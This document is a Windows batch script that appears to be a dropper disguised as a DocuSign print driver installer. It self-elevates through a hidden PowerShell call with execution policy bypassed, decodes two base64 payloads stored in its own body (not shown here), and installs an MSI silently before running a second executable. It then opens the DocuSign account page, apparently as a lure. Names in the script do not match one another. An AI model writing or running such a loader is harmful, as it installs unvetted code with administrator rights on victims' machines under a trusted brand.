@echo off
setlocal EnableExtensions DisableDelayedExpansion
set "BUNDLE=%~f0"

rem Preserve normal UAC. Elevate the signed command interpreter, not this BAT.
if /I "%~1"=="--elevated" goto :elevated
fltmc >nul 2>&1 && goto :elevated
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$q=[char]34; $a='/d /s /c call '+$q+$env:BUNDLE+$q+' --elevated'; Start-Process -FilePath $env:ComSpec -ArgumentList $a -Verb RunAs -WindowStyle Hidden"
exit /b %errorlevel%

:elevated
set "TD=%TEMP%\SC_FeedbackTool_%RANDOM%%RANDOM%"
set "MSI_LOG=%TEMP%\SC_FeedbackTool-install.log"
set "BAT_LOG=%TEMP%\SC_FeedbackTool-bat.log"
set "REBOOT_REQUIRED=0"
>"%BAT_LOG%" echo SC FeedbackTool BAT started: %DATE% %TIME%
mkdir "%TD%" >nul 2>&1
if errorlevel 1 (
  >>"%BAT_LOG%" echo Failed to create temporary directory: %TD%
  exit /b 10
)

call :extract MSI "%TD%\SC_FeedbackTool.msi"
if errorlevel 1 (
  set "FAILED_STAGE=MSI payload extraction"
  goto :extract_fail
)
call :extract EXE "%TD%\SecondInstaller.exe"
if errorlevel 1 (
  set "FAILED_STAGE=second installer payload extraction"
  goto :extract_fail
)

rem Verify exact embedded payload bytes before executing either installer.
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$m=Join-Path -Path $env:TD -ChildPath 'SC_FeedbackTool.msi'; $e=Join-Path -Path $env:TD -ChildPath 'SecondInstaller.exe'; if((Get-FileHash -Algorithm SHA256 -LiteralPath $m).Hash -ne 'C32F5327E33D4B23B152F044F38138C80717EA50CEA88813EDDA23874A4FD90C'){exit 2}; if((Get-FileHash -Algorithm SHA256 -LiteralPath $e).Hash -ne '7AD243CD358D916E029BA8FF9A616DFDCAB29B594A9EBF08A66A1C4BD63FB7E2'){exit 3}" >nul 2>&1
if errorlevel 1 goto :integrity_fail
>>"%BAT_LOG%" echo Embedded payload extraction and SHA-256 verification passed.

del /f /q "%MSI_LOG%" >nul 2>&1
start "" /wait msiexec.exe /i "%TD%\SC_FeedbackTool.msi" /quiet /norestart /L*V "%MSI_LOG%"
set "MSI_EXIT=%errorlevel%"
if "%MSI_EXIT%"=="0" goto :msi_ok
if "%MSI_EXIT%"=="1641" goto :msi_reboot
if "%MSI_EXIT%"=="3010" goto :msi_reboot
goto :msi_fail

:msi_reboot
set "REBOOT_REQUIRED=1"
:msi_ok
del /f /q "%MSI_LOG%" >nul 2>&1

rem Keep the authorized second installer visible so its installation UI can be used.
start "" /wait "%TD%\SecondInstaller.exe"
set "EXE_EXIT=%errorlevel%"
if "%EXE_EXIT%"=="0" goto :exe_ok
if "%EXE_EXIT%"=="1641" goto :exe_reboot
if "%EXE_EXIT%"=="3010" goto :exe_reboot
goto :exe_fail

:exe_reboot
set "REBOOT_REQUIRED=1"
:exe_ok
>>"%BAT_LOG%" echo DocuSign Print Driver completed with exit code %EXE_EXIT%.
if "%REBOOT_REQUIRED%"=="1" (set "FINAL_EXIT=3010") else (set "FINAL_EXIT=0")
start "" "https://account.docusign.com/"
goto :cleanup

:msi_fail
set "FINAL_EXIT=%MSI_EXIT%"
>>"%BAT_LOG%" echo MSI failed with exit code %MSI_EXIT%; see %MSI_LOG%
goto :cleanup

:exe_fail
set "FINAL_EXIT=%EXE_EXIT%"
>>"%BAT_LOG%" echo DocuSign Print Driver failed with exit code %EXE_EXIT%
goto :cleanup

:extract_fail
set "FINAL_EXIT=11"
>>"%BAT_LOG%" echo Failed stage: %FAILED_STAGE%
goto :cleanup
goto :cleanup

:integrity_fail
set "FINAL_EXIT=12"
>>"%BAT_LOG%" echo Extracted payload SHA-256 verification failed.
goto :cleanup
goto :cleanup

:extract
set "SECTION=%~1"
set "OUTFILE=%~2"
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$text=[IO.File]::ReadAllText($env:BUNDLE); $name=[Regex]::Escape($env:SECTION); $match=[Regex]::Match($text,'(?s)###'+$name+'_BEGIN###\s*(.*?)\s*###'+$name+'_END###'); if(-not $match.Success){exit 2}; $data=($match.Groups[1].Value -replace '\s',''); [IO.File]::WriteAllBytes($env:OUTFILE,[Convert]::FromBase64String($data))" >nul 2>&1
exit /b %errorlevel%

:cleanup
del /f /q "%TD%\SC_FeedbackTool.msi" "%TD%\SecondInstaller.exe" >nul 2>&1
rd /s /q "%TD%" >nul 2>&1
exit /b %FINAL_EXIT%

